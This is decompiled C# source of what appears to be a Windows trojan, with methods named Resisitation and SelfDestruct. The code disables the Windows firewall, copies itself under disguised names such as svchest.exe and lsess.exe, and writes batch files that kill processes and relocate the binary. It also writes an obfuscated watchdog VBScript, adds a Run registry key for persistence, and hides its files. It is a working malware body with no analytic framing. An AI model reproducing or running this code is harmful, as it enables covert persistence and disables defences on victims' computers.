					num = 8;
					process2.StartInfo.Arguments = "advfirewall set allprofiles state off";
					goto IL_00a9;
					IL_00a9:
					num = 10;
					process2.StartInfo.FileName = fileName2;
					goto IL_00b9;
					IL_00b9:
					num = 11;
					process2.StartInfo.UseShellExecute = false;
					goto IL_00c9;
					IL_00c9:
					num = 12;
					process2.StartInfo.RedirectStandardOutput = true;
					goto IL_00d9;
					IL_00d9:
					num = 13;
					process2.StartInfo.CreateNoWindow = true;
					goto IL_00e9;
					IL_00e9:
					num = 14;
					process2.Start();
					goto IL_00f4;
					IL_00f4:
					num = 15;
					process2.WaitForExit();
					goto IL_00fe;
					IL_00fe:
					num = 16;
					if ((Operators.CompareString(Application.get_StartupPath(), FilesFolder, false) == 0) | (Operators.CompareString(Application.get_StartupPath(), Environment.SystemDirectory, false) == 0) | (Operators.CompareString(Application.get_StartupPath(), RootFolder + "ProgramData\\Microsoft\\DeviceSync", false) == 0))
					{
						goto end_IL_0001_3;
					}
					goto IL_0150;
					IL_0150:
					num = 19;
					if (!Directory.Exists(BaseFolder))
					{
						goto IL_0164;
					}
					goto IL_0184;
					IL_0164:
					num = 20;
					Directory.CreateDirectory(BaseFolder);
					goto IL_0174;
					IL_0174:
					num = 21;
					FileSystem.SetAttr(BaseFolder, (FileAttribute)2);
					goto IL_0184;
					IL_0184:
					num = 23;
					if (!Directory.Exists(ServerExchangeFolder))
					{
						goto IL_0198;
					}
					goto IL_01a8;
					IL_0198:
					num = 24;
					Directory.CreateDirectory(ServerExchangeFolder);
					goto IL_01a8;
					IL_01a8:
					num = 26;
					if (!Directory.Exists(ToolsFolder))
					{
						goto IL_01bc;
					}
					goto IL_01cc;
					IL_01bc:
					num = 27;
					Directory.CreateDirectory(ToolsFolder);
					goto IL_01cc;
					IL_01cc:
					num = 29;
					if (!Directory.Exists(TempFolder))
					{
						goto IL_01e0;
					}
					goto IL_01f0;
					IL_01e0:
					num = 30;
					Directory.CreateDirectory(TempFolder);
					goto IL_01f0;
					IL_01f0:
					num = 32;
					if (!Directory.Exists(FilesFolder))
					{
						goto IL_0204;
					}
					goto IL_0214;
					IL_0204:
					num = 33;
					Directory.CreateDirectory(FilesFolder);
					goto IL_0214;
					IL_0214:
					num = 35;
					if (!Directory.Exists(PersistentFolder))
					{
						goto IL_0228;
					}
					goto IL_0238;
					IL_0228:
					num = 36;
					Directory.CreateDirectory(PersistentFolder);
					goto IL_0238;
					IL_0238:
					num = 38;
					if (!File.Exists(ToolsFolder + "\\rar.exe"))
					{
						goto IL_0256;
					}
					goto IL_02a8;
					IL_0256:
					num = 39;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(ToolsFolder + "\\rar", Resources.Rar, false);
					goto IL_027f;
					IL_027f:
					num = 40;
					File.Move(ToolsFolder + "\\rar", ToolsFolder + "\\rar.exe");
					goto IL_02a8;
					IL_02a8:
					num = 42;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_02cc;
					}
					goto IL_02fc;
					IL_02cc:
					num = 43;
					text = FilesFolder + "\\lsess.exe";
					goto IL_02e2;
					IL_02e2:
					num = 44;
					text2 = Environment.SystemDirectory + "\\svchest.exe";
					goto IL_0388;
					IL_02fc:
					num = 46;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista"))
					{
						goto IL_0320;
					}
					goto IL_0338;
					IL_0320:
					num = 47;
					text = FilesFolder + "\\lsess.exe";
					goto IL_0388;
					IL_0338:
					num = 49;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_035c;
					}
					goto IL_0388;
					IL_035c:
					num = 50;
					text = FilesFolder + "\\lsess.exe";
					goto IL_0372;
					IL_0372:
					num = 51;
					text2 = RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
					goto IL_0388;
					IL_0388:
					num = 53;
					drives = DriveInfo.GetDrives();
					goto IL_0392;
					IL_0392:
					num = 54;
					array = drives;
					num5 = 0;
					goto IL_039c;
					IL_039c:
					if (num5 < array.Length)
					{
						driveInfo = array[num5];
						goto IL_03b0;
					}
					goto IL_07d9;
					IL_0851:
					num = 114;
					fileInfo.Delete();
					break;
					IL_03b0:
					num = 55;
					if (driveInfo.RootDirectory.Root.ToString()[0] == Environment.CurrentDirectory[0])
					{
						goto IL_03dd;
					}
					goto IL_07d1;
					IL_03dd:
					num = 56;
					if (driveInfo.DriveType == DriveType.Removable)
					{
						goto IL_03f0;
					}
					goto IL_05c4;
					IL_03f0:
					num = 57;
					stream = new FileStream(TempFolder + "\\Relocate.bat", FileMode.Create, FileAccess.Write);
					goto IL_040d;
					IL_040d:
					num = 58;
					streamWriter = new StreamWriter(stream);
					goto IL_041a;
					IL_041a:
					num = 59;
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_0435;
					IL_0435:
					num = 60;
					streamWriter.WriteLine("tskill lsess");
					goto IL_0445;
					IL_0445:
					num = 61;
					streamWriter.WriteLine("tskill svchest");
					goto IL_0455;
					IL_0455:
					num = 62;
					streamWriter.WriteLine("tskill UpdateAccess");
					goto IL_0465;
					IL_0465:
					num = 63;
					streamWriter.WriteLine("tskill updateaccess");
					goto IL_0475;
					IL_0475:
					num = 64;
					streamWriter.WriteLine("tskill *Resume*");
					goto IL_0485;
					IL_0485:
					num = 65;
					streamWriter.WriteLine("tskill *Birth*");
					goto IL_0495;
					IL_0495:
					num = 66;
					streamWriter.WriteLine("tskill *TaxRecord*");
					goto IL_04a5;
					IL_04a5:
					num = 67;
					streamWriter.WriteLine("tskill *Medical*");
					goto IL_04b5;
					IL_04b5:
					num = 68;
					streamWriter.WriteLine("tskill *Angelina*");
					goto IL_04c5;
					IL_04c5:
					num = 69;
					streamWriter.WriteLine("tskill *0m3g4*");
					goto IL_04d5;
					IL_04d5:
					num = 70;
					streamWriter.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_04e5;
					IL_04e5:
					num = 71;
					streamWriter.WriteLine("copy \"" + Application.get_ExecutablePath() + "\" \"" + text2 + "\"");
					goto IL_0529;
					IL_0529:
					num = 72;
					streamWriter.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_0539;
					IL_0539:
					num = 73;
					streamWriter.WriteLine("copy \"" + Application.get_ExecutablePath() + "\" \"" + text + "\"");
					goto IL_057d;
					IL_057d:
					num = 74;
					streamWriter.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_058d;
					IL_058d:
					num = 75;
					streamWriter.WriteLine("start " + text);
					goto IL_05a4;
					IL_05a4:
					num = 76;
					streamWriter.WriteLine("del %0");
					goto IL_05b4;
					IL_05b4:
					num = 77;
					streamWriter.Close();
					goto IL_07d1;
					IL_05c4:
					num = 79;
					goto IL_05c8;
					IL_05c8:
					num = 80;
					stream2 = new FileStream(TempFolder + "\\Relocate.bat", FileMode.Create, FileAccess.Write);
					goto IL_05e5;
					IL_05e5:
					num = 81;
					streamWriter2 = new StreamWriter(stream2);
					goto IL_05f2;
					IL_05f2:
					num = 82;
					streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_060d;
					IL_060d:
					num = 83;
					streamWriter2.WriteLine("tskill lsess");
					goto IL_061d;
					IL_061d:
					num = 84;
					streamWriter2.WriteLine("tskill svchest");
					goto IL_062d;
					IL_062d:
					num = 85;
					streamWriter2.WriteLine("tskill UpdateAccess");
					goto IL_063d;
					IL_063d:
					num = 86;
					streamWriter2.WriteLine("tskill updateaccess");
					goto IL_064d;
					IL_064d:
					num = 87;
					streamWriter2.WriteLine("tskill *Resume*");
					goto IL_065d;
					IL_065d:
					num = 88;
					streamWriter2.WriteLine("tskill *Birth*");
					goto IL_066d;
					IL_066d:
					num = 89;
					streamWriter2.WriteLine("tskill *TaxRecord*");
					goto IL_067d;
					IL_067d:
					num = 90;
					streamWriter2.WriteLine("tskill *Medical*");
					goto IL_068d;
					IL_068d:
					num = 91;
					streamWriter2.WriteLine("tskill *Angelina*");
					goto IL_069d;
					IL_069d:
					num = 92;
					streamWriter2.WriteLine("tskill *0m3g4*");
					goto IL_06ad;
					IL_06ad:
					num = 93;
					streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_06bd;
					IL_06bd:
					num = 94;
					streamWriter2.WriteLine("copy \"" + Application.get_ExecutablePath() + "\" \"" + text2 + "\"");
					goto IL_0701;
					IL_0701:
					num = 95;
					streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_0711;
					IL_0711:
					num = 96;
					streamWriter2.WriteLine("copy \"" + Application.get_ExecutablePath() + "\" \"" + text + "\"");
					goto IL_0755;
					IL_0755:
					num = 97;
					streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_0765;
					IL_0765:
					num = 98;
					streamWriter2.WriteLine("del \"" + Application.get_ExecutablePath() + "\"");
					goto IL_0784;
					IL_0784:
					num = 99;
					streamWriter2.WriteLine("ping 127.0.0.1 -n 3 > %tmp%\\nul");
					goto IL_0794;
					IL_0794:
					num = 100;
					streamWriter2.WriteLine("start " + text);
					goto IL_07ab;
					IL_07ab:
					num = 101;
					streamWriter2.WriteLine("del %0");
					goto IL_07bb;
					IL_07bb:
					num = 102;
					streamWriter2.Close();
					goto IL_07d1;
					IL_07d1:
					num5 = checked(num5 + 1);
					goto IL_07c8;
					IL_07c8:
					num = 105;
					goto IL_039c;
					IL_07d9:
					num = 106;
					process = new Process();
					goto IL_07e4;
					IL_07e4:
					num = 107;
					fileName = TempFolder + "\\Relocate.bat";
					goto IL_07fa;
					IL_07fa:
					num = 108;
					process.StartInfo.FileName = fileName;
					goto IL_080c;
					IL_080c:
					num = 109;
					process.StartInfo.UseShellExecute = false;
					goto IL_081d;
					IL_081d:
					num = 110;
					process.StartInfo.CreateNoWindow = true;
					goto IL_082e;
					IL_082e:
					num = 111;
					process.Start();
					goto IL_083a;
					end_IL_0001_2:
					break;
				}
				num = 115;
				Application.Exit();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2635;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Resisitation()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		string text = default(string);
		string text2 = default(string);
		FileStream stream = default(FileStream);
		StreamWriter streamWriter = default(StreamWriter);
		FileStream stream2 = default(FileStream);
		StreamWriter streamWriter2 = default(StreamWriter);
		FileStream stream3 = default(FileStream);
		StreamWriter streamWriter3 = default(StreamWriter);
		FileStream stream4 = default(FileStream);
		StreamWriter streamWriter4 = default(StreamWriter);
		FileInfo fileInfo2 = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 2427:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_004e;
						case 5:
							goto IL_0062;
						case 7:
							goto IL_007b;
						case 8:
							goto IL_009e;
						case 10:
							goto IL_00b4;
						case 11:
							goto IL_00d8;
						case 12:
							goto IL_00ed;
						case 6:
						case 9:
						case 13:
						case 14:
							goto IL_0103;
						case 15:
							goto IL_0126;
						case 16:
							goto IL_0132;
						case 17:
							goto IL_014d;
						case 18:
							goto IL_015d;
						case 19:
							goto IL_016d;
						case 20:
							goto IL_017d;
						case 21:
							goto IL_018d;
						case 22:
							goto IL_019d;
						case 23:
							goto IL_01ad;
						case 24:
							goto IL_01bd;
						case 25:
							goto IL_01cd;
						case 26:
							goto IL_01dd;
						case 27:
							goto IL_01ed;
						case 28:
							goto IL_01fd;
						case 29:
							goto IL_020d;
						case 30:
							goto IL_021d;
						case 31:
							goto IL_022d;
						case 32:
							goto IL_0285;
						case 33:
							goto IL_0295;
						case 34:
							goto IL_02a5;
						case 35:
							goto IL_02b5;
						case 36:
							goto IL_02c5;
						case 37:
							goto IL_02d0;
						case 38:
							goto IL_02f3;
						case 39:
							goto IL_02ff;
						case 40:
							goto IL_031a;
						case 41:
							goto IL_032a;
						case 42:
							goto IL_033a;
						case 43:
							goto IL_034a;
						case 44:
							goto IL_035a;
						case 45:
							goto IL_039f;
						case 46:
							goto IL_03af;
						case 47:
							goto IL_03bf;
						case 48:
							goto IL_03df;
						case 49:
							goto IL_03ef;
						case 50:
							goto IL_03ff;
						case 51:
							goto IL_040f;
						case 52:
							goto IL_041f;
						case 53:
							goto IL_042f;
						case 54:
							goto IL_043f;
						case 55:
							goto IL_044f;
						case 56:
							goto IL_045f;
						case 57:
							goto IL_046f;
						case 58:
							goto IL_047f;
						case 59:
							goto IL_048f;
						case 60:
							goto IL_049f;
						case 61:
							goto IL_04af;
						case 62:
							goto IL_04bf;
						case 63:
							goto IL_04cf;
						case 64:
							goto IL_04df;
						case 65:
							goto IL_04ef;
						case 66:
							goto IL_04ff;
						case 67:
							goto IL_050f;
						case 68:
							goto IL_051f;
						case 69:
							goto IL_052a;
						case 70:
							goto IL_054e;
						case 71:
							goto IL_055b;
						case 72:
							goto IL_0576;
						case 73:
							goto IL_0586;
						case 74:
							goto IL_0596;
						case 75:
							goto IL_05a6;
						case 76:
							goto IL_05b6;
						case 77:
							goto IL_05c6;
						case 78:
							goto IL_05d6;
						case 79:
							goto IL_05e6;
						case 80:
							goto IL_05f6;
						case 81:
							goto IL_060d;
						case 82:
							goto IL_0618;
						case 83:
							goto IL_0635;
						case 84:
							goto IL_0642;
						case 85:
							goto IL_065d;
						case 86:
							goto IL_066d;
						case 87:
							goto IL_067d;
						case 88:
							goto IL_0688;
						case 89:
							goto IL_06c0;
						case 90:
							goto IL_06ce;
						case 91:
							goto IL_06ef;
						case 92:
							goto IL_06fd;
						case 93:
							goto IL_0717;
						case 94:
							goto IL_0725;
						case 95:
							goto IL_0746;
						case 96:
							goto IL_0767;
						case 97:
							goto IL_0781;
						case 98:
							goto IL_079b;
						case 99:
							goto IL_07bc;
						case 100:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 101:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_07bc:
					num = 99;
					fileInfo.Delete();
					break;
					IL_079b:
					num = 98;
					File.SetAttributes(PersistentFolder + "\\0m3g4-" + text + ".bat", FileAttributes.Hidden);
					goto IL_07bc;
					IL_000a:
					num = 2;
					text = Conversions.ToString(DateAndTime.get_Now().TimeOfDay.TotalMilliseconds);
					goto IL_002b;
					IL_002b:
					num = 3;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_004e;
					}
					goto IL_007b;
					IL_004e:
					num = 4;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_0062;
					IL_0062:
					num = 5;
					text2 = Environment.SystemDirectory + "\\svchest.exe";
					goto IL_0103;
					IL_007b:
					num = 7;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista"))
					{
						goto IL_009e;
					}
					goto IL_00b4;
					IL_009e:
					num = 8;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_0103;
					IL_00b4:
					num = 10;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_00d8;
					}
					goto IL_0103;
					IL_00d8:
					num = 11;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_00ed;
					IL_00ed:
					num = 12;
					text2 = RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
					goto IL_0103;
					IL_0103:
					num = 14;
					stream = new FileStream(TempFolder + "\\0m3g4-" + text + ".txt", FileMode.Create, FileAccess.Write);
					goto IL_0126;
					IL_0126:
					num = 15;
					streamWriter = new StreamWriter(stream);
					goto IL_0132;
					IL_0132:
					num = 16;
					streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_014d;
					IL_014d:
					num = 17;
					streamWriter.WriteLine("On Error Resume Next");
					goto IL_015d;
					IL_015d:
					num = 18;
					streamWriter.WriteLine("state = 1");
					goto IL_016d;
					IL_016d:
					num = 19;
					streamWriter.WriteLine("While state = 1");
					goto IL_017d;
					IL_017d:
					num = 20;
					streamWriter.WriteLine("Dim WshShell");
					goto IL_018d;
					IL_018d:
					num = 21;
					streamWriter.WriteLine("Set WshShell = WScript.CreateObject (\"WScript.Shell\")");
					goto IL_019d;
					IL_019d:
					num = 22;
					streamWriter.WriteLine("Set colProcessList = GetObject(\"Winmgmts:\").ExecQuery (\"Select * from Win32_Process\")");
					goto IL_01ad;
					IL_01ad:
					num = 23;
					streamWriter.WriteLine("For Each objProcess in colProcessList");
					goto IL_01bd;
					IL_01bd:
					num = 24;
					streamWriter.WriteLine("if objProcess.name = \"lsess.exe\" OR objProcess.name = \"svchest.exe\" then");
					goto IL_01cd;
					IL_01cd:
					num = 25;
					streamWriter.WriteLine("vFound = True");
					goto IL_01dd;
					IL_01dd:
					num = 26;
					streamWriter.WriteLine("End if");
					goto IL_01ed;
					IL_01ed:
					num = 27;
					streamWriter.WriteLine("Next");
					goto IL_01fd;
					IL_01fd:
					num = 28;
					streamWriter.WriteLine("If vFound = True then");
					goto IL_020d;
					IL_020d:
					num = 29;
					streamWriter.WriteLine("wscript.sleep 60000");
					goto IL_021d;
					IL_021d:
					num = 30;
					streamWriter.WriteLine("Else");
					goto IL_022d;
					IL_022d:
					num = 31;
					streamWriter.WriteLine("WshShell.run (\"cscript " + PersistentFolder + "\\0m3g4-hidden.vbs " + PersistentFolder + "\\0m3g4-" + text + ".bat\")");
					goto IL_0285;
					IL_0285:
					num = 32;
					streamWriter.WriteLine("wscript.sleep 30000");
					goto IL_0295;
					IL_0295:
					num = 33;
					streamWriter.WriteLine("End If");
					goto IL_02a5;
					IL_02a5:
					num = 34;
					streamWriter.WriteLine("vFound = False");
					goto IL_02b5;
					IL_02b5:
					num = 35;
					streamWriter.WriteLine("Wend");
					goto IL_02c5;
					IL_02c5:
					num = 36;
					streamWriter.Close();
					goto IL_02d0;
					IL_02d0:
					num = 37;
					stream2 = new FileStream(TempFolder + "\\0m3g4-" + text + ".vbs", FileMode.Create, FileAccess.Write);
					goto IL_02f3;
					IL_02f3:
					num = 38;
					streamWriter2 = new StreamWriter(stream2);
					goto IL_02ff;
					IL_02ff:
					num = 39;
					streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_031a;
					IL_031a:
					num = 40;
					streamWriter2.WriteLine("'Sneaky Vbs");
					goto IL_032a;
					IL_032a:
					num = 41;
					streamWriter2.WriteLine("On Error Resume Next");
					goto IL_033a;
					IL_033a:
					num = 42;
					streamWriter2.WriteLine("Randomize");
					goto IL_034a;
					IL_034a:
					num = 43;
					streamWriter2.WriteLine("set fso = CreateObject(\"Scripting.FileSystemObject\")");
					goto IL_035a;
					IL_035a:
					num = 44;
					streamWriter2.WriteLine("fileName = \"" + TempFolder + "\\0m3g4-" + text + ".txt\"");
					goto IL_039f;
					IL_039f:
					num = 45;
					streamWriter2.WriteLine("set src = fso.OpenTextfile(fileName,1)");
					goto IL_03af;
					IL_03af:
					num = 46;
					streamWriter2.WriteLine("body = src.readall");
					goto IL_03bf;
					IL_03bf:
					num = 47;
					streamWriter2.WriteLine("set rep = fso.createtextfile(\"" + PersistentFolder + "\\OverTime.vbs\",true)");
					goto IL_03df;
					IL_03df:
					num = 48;
					streamWriter2.WriteLine("rep.writeline \"Execute(\" & Obfuscate(body) & \" ) \"");
					goto IL_03ef;
					IL_03ef:
					num = 49;
					streamWriter2.WriteLine("");
					goto IL_03ff;
					IL_03ff:
					num = 50;
					streamWriter2.WriteLine("Function Obfuscate(txt)");
					goto IL_040f;
					IL_040f:
					num = 51;
					streamWriter2.WriteLine("enc = \"\"");
					goto IL_041f;
					IL_041f:
					num = 52;
					streamWriter2.WriteLine("For i = 1 To len(txt)");
					goto IL_042f;
					IL_042f:
					num = 53;
					streamWriter2.WriteLine("enc = enc & \"chr( \" & form( asc(mid(txt,i,1)) ) & \" ) & \"");
					goto IL_043f;
					IL_043f:
					num = 54;
					streamWriter2.WriteLine("next");
					goto IL_044f;
					IL_044f:
					num = 55;
					streamWriter2.WriteLine("Obfuscate = enc & \" vbcrlf \"");
					goto IL_045f;
					IL_045f:
					num = 56;
					streamWriter2.WriteLine("End Function");
					goto IL_046f;
					IL_046f:
					num = 57;
					streamWriter2.WriteLine("");
					goto IL_047f;
					IL_047f:
					num = 58;
					streamWriter2.WriteLine("");
					goto IL_048f;
					IL_048f:
					num = 59;
					streamWriter2.WriteLine("");
					goto IL_049f;
					IL_049f:
					num = 60;
					streamWriter2.WriteLine("Function form(n)");
					goto IL_04af;
					IL_04af:
					num = 61;
					streamWriter2.WriteLine("r = int(rnd * 10000)");
					goto IL_04bf;
					IL_04bf:
					num = 62;
					streamWriter2.WriteLine("k = int(rnd * 3)");
					goto IL_04cf;
					IL_04cf:
					num = 63;
					streamWriter2.WriteLine("if(k = 0) then ret = (r+n) & \"-\" & r");
					goto IL_04df;
					IL_04df:
					num = 64;
					streamWriter2.WriteLine("if(k = 1) then ret = (n-r) & \"+\" & r");
					goto IL_04ef;
					IL_04ef:
					num = 65;
					streamWriter2.WriteLine("if(k = 2) then ret = (n*r) & \"/\" & r");
					goto IL_04ff;
					IL_04ff:
					num = 66;
					streamWriter2.WriteLine("form = ret");
					goto IL_050f;
					IL_050f:
					num = 67;
					streamWriter2.WriteLine("End Function");
					goto IL_051f;
					IL_051f:
					num = 68;
					streamWriter2.Close();
					goto IL_052a;
					IL_052a:
					num = 69;
					stream3 = new FileStream(PersistentFolder + "\\0m3g4-" + text + ".bat", FileMode.Create, FileAccess.Write);
					goto IL_054e;
					IL_054e:
					num = 70;
					streamWriter3 = new StreamWriter(stream3);
					goto IL_055b;
					IL_055b:
					num = 71;
					streamWriter3.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_0576;
					IL_0576:
					num = 72;
					streamWriter3.WriteLine("tskill lsess");
					goto IL_0586;
					IL_0586:
					num = 73;
					streamWriter3.WriteLine("tskill svchest");
					goto IL_0596;
					IL_0596:
					num = 74;
					streamWriter3.WriteLine("tskill *Resume*");
					goto IL_05a6;
					IL_05a6:
					num = 75;
					streamWriter3.WriteLine("tskill *Birth*");
					goto IL_05b6;
					IL_05b6:
					num = 76;
					streamWriter3.WriteLine("tskill *TaxRecord*");
					goto IL_05c6;
					IL_05c6:
					num = 77;
					streamWriter3.WriteLine("tskill *Medical*");
					goto IL_05d6;
					IL_05d6:
					num = 78;
					streamWriter3.WriteLine("tskill *Angelina*");
					goto IL_05e6;
					IL_05e6:
					num = 79;
					streamWriter3.WriteLine("tskill *0m3g4*");
					goto IL_05f6;
					IL_05f6:
					num = 80;
					streamWriter3.WriteLine("start " + text2);
					goto IL_060d;
					IL_060d:
					num = 81;
					streamWriter3.Close();
					goto IL_0618;
					IL_0618:
					num = 82;
					stream4 = new FileStream(PersistentFolder + "\\0m3g4-hidden.vbs", FileMode.Create, FileAccess.Write);
					goto IL_0635;
					IL_0635:
					num = 83;
					streamWriter4 = new StreamWriter(stream4);
					goto IL_0642;
					IL_0642:
					num = 84;
					streamWriter4.BaseStream.Seek(0L, SeekOrigin.End);
					goto IL_065d;
					IL_065d:
					num = 85;
					streamWriter4.WriteLine("Set WshShell = WScript.CreateObject(\"WScript.Shell\")");
					goto IL_066d;
					IL_066d:
					num = 86;
					streamWriter4.WriteLine("WshShell.Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\" & sargs, 0, False");
					goto IL_067d;
					IL_067d:
					num = 87;
					streamWriter4.Close();
					goto IL_0688;
					IL_0688:
					num = 88;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("patience", PersistentFolder + "\\OverTime.vbs");
					goto IL_06c0;
					IL_06c0:
					num = 89;
					Thread.Sleep(1000);
					goto IL_06ce;
					IL_06ce:
					num = 90;
					Process.Start(TempFolder + "\\0m3g4-" + text + ".vbs");
					goto IL_06ef;
					IL_06ef:
					num = 91;
					Thread.Sleep(3000);
					goto IL_06fd;
					IL_06fd:
					num = 92;
					Process.Start(PersistentFolder + "\\OverTime.vbs");
					goto IL_0717;
					IL_0717:
					num = 93;
					Thread.Sleep(3000);
					goto IL_0725;
					IL_0725:
					num = 94;
					fileInfo = new FileInfo(TempFolder + "\\0m3g4-" + text + ".vbs");
					goto IL_0746;
					IL_0746:
					num = 95;
					fileInfo2 = new FileInfo(TempFolder + "\\0m3g4-" + text + ".txt");
					goto IL_0767;
					IL_0767:
					num = 96;
					File.SetAttributes(PersistentFolder + "\\OverTime.vbs", FileAttributes.Hidden);
					goto IL_0781;
					IL_0781:
					num = 97;
					File.SetAttributes(PersistentFolder + "\\0m3g4-hidden.vbs", FileAttributes.Hidden);
					goto IL_079b;
					end_IL_0001_2:
					break;
				}
				num = 100;
				fileInfo2.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 2427;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void SelfDestruct()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		Process process = default(Process);
		string fileName = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 1443:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_003d;
						case 5:
							goto IL_0060;
						case 6:
							goto IL_0074;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_00af;
						case 11:
							goto IL_00c6;
						case 12:
							goto IL_00ea;
						case 13:
							goto IL_00ff;
						case 7:
						case 10:
						case 14:
						case 15:
							goto IL_0114;
						case 16:
							goto IL_011e;
						case 17:
							goto IL_0128;
						case 18:
							goto IL_013c;
						case 19:
							goto IL_014c;
						case 20:
							goto IL_015c;
						case 21:
							goto IL_016c;
						case 22:
							goto IL_017c;
						case 23:
							goto IL_0187;
						case 24:
							goto IL_0191;
						case 25:
							goto IL_01ce;
						case 26:
							goto IL_01da;
						case 27:
						case 28:
							goto IL_01e4;
						case 29:
							goto IL_020b;
						case 30:
							goto IL_0225;
						case 31:
							goto IL_024a;
						case 32:
						case 33:
							goto IL_0263;
						case 34:
							goto IL_028b;
						case 37:
							goto IL_02a9;
						case 38:
							goto IL_02ef;
						case 39:
							goto IL_0309;
						case 40:
							goto IL_032e;
						case 41:
						case 42:
							goto IL_0347;
						case 43:
							goto IL_036c;
						case 35:
						case 36:
						case 44:
						case 45:
						case 46:
							goto IL_0385;
						case 47:
							goto IL_03ad;
						case 48:
							goto IL_03d5;
						case 49:
							goto IL_03fd;
						case 50:
							goto IL_0425;
						case 51:
							goto IL_044d;
						case 52:
							goto IL_045e;
						case 53:
						case 54:
							goto IL_0487;
						case 55:
							goto IL_0491;
						case 56:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 57:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0491:
					num = 55;
					Thread.Sleep(2000);
					break;
					IL_0487:
					num = 54;
					SelfDestructNotify();
					goto IL_0491;
					IL_000a:
					num = 2;
					Victim_Offline();
					goto IL_0013;
					IL_0013:
					num = 3;
					text = Conversions.ToString(DateAndTime.get_Now().TimeOfDay.TotalMilliseconds) + ".old";
					goto IL_003d;
					IL_003d:
					num = 4;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("XP"))
					{
						goto IL_0060;
					}
					goto IL_008c;
					IL_0060:
					num = 5;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_0074;
					IL_0074:
					num = 6;
					text2 = Environment.SystemDirectory + "\\svchest.exe";
					goto IL_0114;
					IL_008c:
					num = 8;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("Vista"))
					{
						goto IL_00af;
					}
					goto IL_00c6;
					IL_00af:
					num = 9;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_0114;
					IL_00c6:
					num = 11;
					if (((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString()
						.Contains("7"))
					{
						goto IL_00ea;
					}
					goto IL_0114;
					IL_00ea:
					num = 12;
					_ = FilesFolder + "\\lsess.exe";
					goto IL_00ff;
					IL_00ff:
					num = 13;
					text2 = RootFolder + "ProgramData\\Microsoft\\DeviceSync\\svchest.exe";
					goto IL_0114;
					IL_0114:
					num = 15;
